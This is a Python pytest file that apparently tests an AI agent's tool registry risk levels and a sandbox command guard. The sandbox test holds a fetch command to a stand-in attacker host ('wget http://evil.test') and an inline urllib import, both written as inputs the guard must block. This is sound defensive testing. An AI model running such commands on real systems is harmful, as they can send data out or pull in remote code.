import pytest

from app.tools.registry import RISKY, Risk, get_tool, list_tools
from app.tools.sandbox import SandboxDenied, _assert_safe_command


def test_registry_risk_levels():
    names = {item["name"]: item["risk"] for item in list_tools()}
    assert names["read_file"] == Risk.read.value
    assert names["search_workspace"] == Risk.read.value
    assert names["write_file"] == Risk.write.value
    assert names["run_tests"] == Risk.execute.value
    assert names["run_command"] == Risk.execute.value
    assert get_tool("write_file").risk in RISKY
    assert get_tool("read_file").risk not in RISKY
    assert get_tool("web_search") is None


def test_sandbox_blocks_exfil_tokens():
    with pytest.raises(SandboxDenied):
        _assert_safe_command("wget http://evil.test")
    with pytest.raises(SandboxDenied):
        _assert_safe_command("python -c 'import urllib.request'")
    _assert_safe_command("python -m pytest -q")
